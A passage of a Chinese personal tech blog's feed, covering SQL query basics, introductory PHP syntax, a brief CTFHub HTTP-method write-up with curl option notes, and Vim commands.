class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age <span class="keyword">ASC</span>, Gender;</span><br></pre></td></tr></table></figure><p>如果有WHERE子句，那么ORDER BY需要放在WHERE后面，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students </span><br><span class="line"><span class="keyword">WHERE</span> City <span class="operator">=</span> <span class="string">&#x27;Shanghai&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Age;</span><br></pre></td></tr></table></figure><h2 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h2><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>假设我们要统计学生表的记录数量，除了直接使用<code>SELECT * FROM Students</code>得到结果集后，通过手动查询数量这种麻烦的方法外，我们可以使用<code>SQL</code>提供的聚合函数 <code>COUNT</code>，快速获得结果。以查询有多少学生为例，我们以下<code>SQL</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students;</span><br></pre></td></tr></table></figure><p>除了 <code>COUNT</code> 函数外，<code>SQL</code>还提供以下这些常用的聚合函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUM</td><td>计算某一列的总和，该列必须为数值类型</td></tr><tr><td>AVG</td><td>计算某一列的平均数，该列必须为数值类型</td></tr><tr><td>MAX</td><td>计算某一列的最大值</td></tr><tr><td>MIN</td><td>计算某一列的最小值</td></tr></tbody></table><h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><p><code>SQL</code>还提供了“分组聚合”功能，帮助我们将具有共性字段的记录整合起来。比如我们想要根据城市<code>City</code>对学生进行分组，并需要查询每个城市有多少学生，可以使用<code>GROUP BY</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City;</span><br></pre></td></tr></table></figure><p>执行此语句后，GROUP BY子句会按照City将学生进行分组，所有City相同的学生会被放到同一个组中，再进行分别计算，所以COUNT(*)的结果对应的就是特定城市的学生数量。其结果类似以下：</p><table><thead><tr><th>City</th><th>COUNT(*)</th></tr></thead><tbody><tr><td>Beijing</td><td>1</td></tr><tr><td>Los Angeles</td><td>2</td></tr><tr><td>New York City</td><td>1</td></tr><tr><td>Shanghai</td><td>2</td></tr></tbody></table><p>如果我们将Name也放入查询结果，就不合适了，因为来自相同城市的学生可能有很多位，名字就各不相同了，所以以下语句是不合法的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, <span class="built_in">COUNT</span>(<span class="operator">*</span>), Name <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City;</span><br></pre></td></tr></table></figure><p>GROUP BY 也能放入多个字段，比如我们想先将学生根据City分组，然后再根据性别分组，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> City, Gender, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> Students <span class="keyword">GROUP</span> <span class="keyword">BY</span> City, Gender;</span><br></pre></td></tr></table></figure><h2 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h2><p><code>SELECT</code> 查询除了能从单表中查数据外，也能从多表中查询数据。语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1, table2;</span><br></pre></td></tr></table></figure><p>比如要查询<code>Students</code>表和<code>Courses</code>表的“乘积”，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>假设<code>Students</code>有5列字段和7行记录，<code>Courses</code>有2列字段和3行记录，其结果就是一个拥有21 (3 * 7) 行记录和 7 (5 + 2) 列字段的二维表，既Students表的每一行和Courses表的每一行两两拼在一起。结果集的列数会是两表列数之和，而行数是两表行数之积。</p><p>有时候两张表可能拥有相同名字的字段，那么结果则会让人疑惑，我们可以通过使用 AS 取别名来区别字段。比如使用以下语句给<code>StudentID</code>和<code>CourseID</code>改名为<code>StudentId</code>和<code>CourseId</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Students.StudentID <span class="keyword">AS</span> StudentId, Courses.CourseID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>给字段取别名的语法类似 <code>column_name AS new_column_name</code>，上面的语句分别给<code>StudentID</code>和<code>CoursesID</code>取了别名<code>StudentId</code>和<code>CourseId</code>，虽然在这个例子中，我们只是将最后的字母D变为小写。但考虑一下另一种情况：假设<code>Students</code>和<code>Courses</code>的主键字段都叫ID，那么这个别名就很有帮助了，我们可以使用以下语句使查询结果更明了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Students.ID <span class="keyword">AS</span> StudentId, Courses.ID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students, Courses;</span><br></pre></td></tr></table></figure><p>除了给输出字段取别名外，给表格取别名也很有用的，语法类似<code>table_name AS alias</code>，我们可以将上面的语句写成下面这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.ID <span class="keyword">AS</span> StudentId, C.ID <span class="keyword">AS</span> CourseId <span class="keyword">FROM</span> Students <span class="keyword">AS</span> S, Courses <span class="keyword">AS</span> C;</span><br></pre></td></tr></table></figure><p>在多表查询中，我们同样还是能使用<code>WHERE</code>子句。为了帮助大家理解之后的内容，我们需要给<code>Students</code>添加一列新的字段<code>CourseID</code>，代表此学生选择的课程：</p><table><thead><tr><th>StudentID</th><th>Name</th><th>Gender</th><th>Age</th><th>City</th><th>CourseID</th></tr></thead><tbody><tr><td>1</td><td>David</td><td>M</td><td>21</td><td>Shanghai</td><td>2</td></tr></tbody></table><p>如果我们如果想要抓取<code>StudentID</code>和其对应的课程名字，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.StudentID, C.CourseName <span class="keyword">FROM</span> Students <span class="keyword">AS</span> S, Courses <span class="keyword">AS</span> C <span class="keyword">WHERE</span> S.CourseID <span class="operator">=</span> C.CourseID;</span><br></pre></td></tr></table></figure><p>除了<code>WHERE</code>子句，其他子句类似<code>ORDER BY</code>，<code>GROUP BY</code>也都适用于多表查询。</p>]]></content>
    
    
    <summary type="html">数据库基础语法笔记</summary>
    
    
    
    <category term="数据库" scheme="http://jacen-cpu.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="SQL" scheme="http://jacen-cpu.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>php基础知识</title>
    <link href="http://jacen-cpu.github.io/2021/07/11/php%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://jacen-cpu.github.io/2021/07/11/php%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2021-07-10T23:10:05.000Z</published>
    <updated>2021-07-14T02:08:12.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>PHP脚本以<code>&lt;php?</code>开头，以<code>?&gt;</code>结尾。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">    <span class="comment">//代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php文件的默认扩展名是<code>.php</code></p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">    <span class="comment">// 单行注释</span></span><br><span class="line">    <span class="comment"># 单行注释</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    多</span></span><br><span class="line"><span class="comment">    行</span></span><br><span class="line"><span class="comment">    注</span></span><br><span class="line"><span class="comment">    释</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php的大小写敏感"><a href="#php的大小写敏感" class="headerlink" title="php的大小写敏感"></a>php的大小写敏感</h3><p>所有用户定义的函数、类、关键词都对大小写不敏感。</p><p>所有的变量都对大小写敏感。</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li>变量以<code>$</code>开头</li><li>变量名以字母和下划线开头</li><li>变量名不能以数字开头</li><li>变量名只能包含字母、数字、下划线</li></ul><p><strong>变量会在首次赋值时被创建。</strong></p><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h3 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h3><p>通常php变量只有一个单独的范围，这个单独的范围，还包括了include和require引入的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;b.inc&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是在用户自定义的函数中，则不然。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>这个脚本不会有任何输出。此时我们可以用<code>global</code>关键字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">Test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还有一种方法是使用php自定义的<code>$GLOBALS</code>数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sum</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;a&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">Sum();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>它只在局部函数中存在，当程序执行离开此作用域时，其值不会丢失。</p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 <em>hello</em> 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时，两个变量都被定义了：$a 的内容是“hello”并且 $hello 的内容是“world”。因此，以下语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与以下语句输出完全相同的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h2><h3 id="POST和GET的区别"><a href="#POST和GET的区别" class="headerlink" title="POST和GET的区别"></a>POST和GET的区别</h3><p>通过GET方法从表单发送的信息对任何人都是可见的，数据数量限制在2000个字符。用于发送非敏感的数据。</p><p>通过POST方法从表单发送的信息对其他人是不可见发，数据数量也是无限制的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本语法&quot;&gt;&lt;a href=&quot;#基本语法&quot; class=&quot;headerlink&quot; title=&quot;基本语法&quot;&gt;&lt;/a&gt;基本语法&lt;/h2&gt;&lt;p&gt;PHP脚本以&lt;code&gt;&amp;lt;php?&lt;/code&gt;开头，以&lt;code&gt;?&amp;gt;&lt;/code&gt;结尾。&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    <category term="后端" scheme="http://jacen-cpu.github.io/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
    <category term="php" scheme="http://jacen-cpu.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>请求方式</title>
    <link href="http://jacen-cpu.github.io/2021/05/16/%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/"/>
    <id>http://jacen-cpu.github.io/2021/05/16/%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</id>
    <published>2021-05-16T10:50:58.000Z</published>
    <updated>2021-05-23T11:24:49.324Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a>WriteUp:</h2><p>根据题目提示使用CTF**B Method（CTFHUB Method）</p><p>得到flag。</p><h2 id="Curl用法"><a href="#Curl用法" class="headerlink" title="Curl用法:"></a>Curl用法:</h2><p>不带有任何参数时，curl 就是发出 GET 请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://www.example.com</span><br></pre></td></tr></table></figure><h3 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h3><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p><h3 id="b"><a href="#b" class="headerlink" title="-b"></a>-b</h3><p><code>-b</code> 用来给服务器发送cookie。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;foo=bar&#x27;</span> https://google.com</span><br></pre></td></tr></table></figure><h3 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h3><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -c cookies.txt https://www.google.com</span><br></pre></td></tr></table></figure><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p><code>-d</code>参数用于发送 POST 请求的数据体。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d<span class="string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ curl -d <span class="string">&#x27;login=emma&#x27;</span> -d <span class="string">&#x27;password=123&#x27;</span> -X POST  https://google.com/login</span><br></pre></td></tr></table></figure><p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p><p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d <span class="string">&#x27;@data.txt&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure><p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p><h3 id="–-data-urlencode"><a href="#–-data-urlencode" class="headerlink" title="– data-urlencode"></a>– data-urlencode</h3><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --data-urlencode <span class="string">&#x27;comment=hello world&#x27;</span> https://google.com/login</span><br></pre></td></tr></table></figure><p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -e <span class="string">&#x27;https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure><p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p><p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;Referer: https://google.com?q=example&#x27;</span> https://www.example.com</span><br></pre></td></tr></table></figure><h3 id="F"><a href="#F" class="headerlink" title="-F"></a>-F</h3><p><code>-F</code>参数用来向服务器上传二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure><p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p><p><code>-F</code>参数可以指定 MIME 类型。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;type=image/png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure><p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p><p><code>-F</code>参数也可以指定文件名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -F <span class="string">&#x27;file=@photo.png;filename=me.png&#x27;</span> https://google.com/profile</span><br></pre></td></tr></table></figure><p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WriteUp&quot;&gt;&lt;a href=&quot;#WriteUp&quot; class=&quot;headerlink&quot; title=&quot;WriteUp:&quot;&gt;&lt;/a&gt;WriteUp:&lt;/h2&gt;&lt;p&gt;根据题目提示使用CTF**B Method（CTFHUB Method）&lt;/p&gt;


&lt;p&gt;得到</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="http://jacen-cpu.github.io/2021/05/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://jacen-cpu.github.io/2021/05/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2021-05-12T10:55:09.000Z</published>
    <updated>2021-05-12T11:07:11.955Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vim基础</title>
    <link href="http://jacen-cpu.github.io/2021/04/23/Vim%E5%9F%BA%E7%A1%80/"/>
    <id>http://jacen-cpu.github.io/2021/04/23/Vim%E5%9F%BA%E7%A1%80/</id>
    <published>2021-04-23T12:50:00.000Z</published>
    <updated>2021-05-21T11:12:01.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h1><blockquote><p><strong>Vim</strong>是从<a class="link"   href="https://zh.wikipedia.org/wiki/Vi" >vi<i class="fas fa-external-link-alt"></i></a>发展出来的一个<a class="link"   href="https://zh.wikipedia.org/wiki/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8" >文本编辑器<i class="fas fa-external-link-alt"></i></a>。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和<a class="link"   href="https://zh.wikipedia.org/wiki/Emacs" >Emacs<i class="fas fa-external-link-alt"></i></a>并列成为<a class="link"   href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F" >类Unix系统<i class="fas fa-external-link-alt"></i></a>用户最喜欢的编辑器。</p></blockquote><h1 id="四种模式"><a href="#四种模式" class="headerlink" title="四种模式"></a>四种模式</h1><ol><li>普通模式（<code>Esc</code>）</li><li>插入模式（<code>i</code>, <code>a</code>, <code>o</code>）</li><li>命令模式（<code>:</code>）</li><li>视图模式（<code>v</code>, <code>V</code>）</li></ol><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p>取代普通的方向键或是鼠标，<code>h</code> 是左， <code>j</code>是下， <code>k</code>是上，<code>l</code> 是右。</p><h2 id="翻页"><a href="#翻页" class="headerlink" title="翻页"></a>翻页</h2><p>翻整页： <code>Ctrl + f</code>即<code>Pagedown</code>, <code>Ctrl + b</code>即<code>PageUp</code></p><p>翻半页： <code>Ctrl + d</code>, <code>Ctrl + u</code></p><p>翻到最后一行：<code>shift + g</code>即直接输入大写G。</p><p>翻到第一行：<code>gg</code></p><p>翻到指定的行：<code>ng</code> n为行号。</p><h2 id="不同方式编辑文本，跳跃单词"><a href="#不同方式编辑文本，跳跃单词" class="headerlink" title="不同方式编辑文本，跳跃单词"></a>不同方式编辑文本，跳跃单词</h2><p>编辑：</p><p><code>i</code> 光标位置前面插入</p><p><code>a</code>光标位置后面插入</p><p><code>o</code>直接下一行插入 </p><p><code>x</code>删除光标所在字符</p><p><code>dd</code>删除整个一行</p><p><code>u</code>撤销</p><p><code>dw</code>删除所在光标所在的单词</p><p><code>b</code>跳越单词首字母（往前跳跃）</p><p><code>e</code>跳跃单词最后</p><p><code>w</code>跳跃下一个单词的首字母</p><p><code>shift + w</code>,<code>shift + b</code>,<code>shift + e</code>大跳</p><p><code>r</code>替换一个</p><p><code>R</code>替换任意</p><h2 id="跳跃行首行尾"><a href="#跳跃行首行尾" class="headerlink" title="跳跃行首行尾"></a>跳跃行首行尾</h2><p><code>shift + 6</code>跳到行首</p><p><code>shift + 4</code>跳到行尾</p><h2 id="大括号跳跃函数段落"><a href="#大括号跳跃函数段落" class="headerlink" title="大括号跳跃函数段落"></a>大括号跳跃函数段落</h2><p><code>&#123;&#125;</code></p><h2 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h2><p><code>p</code>粘贴</p><p><code>y</code>复制</p><p><code>y + w</code>复制这个单词</p><p><code>y + $</code>从当前复制到末尾</p><h2 id="Visual可视化模式"><a href="#Visual可视化模式" class="headerlink" title="Visual可视化模式"></a>Visual可视化模式</h2><h2 id="视图模式的其他用法"><a href="#视图模式的其他用法" class="headerlink" title="视图模式的其他用法"></a>视图模式的其他用法</h2><h2 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h2><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简单介绍&quot;&gt;&lt;a href=&quot;#简单介绍&quot; class=&quot;headerlink&quot; title=&quot;简单介绍&quot;&gt;&lt;/a&gt;简单介绍&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Vim&lt;/strong&gt;是从&lt;a class=&quot;link&quot;   href=&quot;htt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>环境变量</title>
    <link href="http://jacen-cpu.github.io/2021/04/16/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <id>http://jacen-cpu.github.io/2021/04/16/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</id>
    <published>2021-04-16T10:55:50.000Z</published>
    <updated>2021-04-16T10:55:50.518Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>父子shell</title>
    <link href="http://jacen-cpu.github.io/2021/04/09/%E7%88%B6%E5%AD%90shell/"/>
    <id>http://jacen-cpu.github.io/2021/04/09/%E7%88%B6%E5%AD%90shell/</id>
    <published>2021-04-09T11:00:01.000Z</published>
    <updated>2021-05-21T11:16:07.167Z</updated>
    
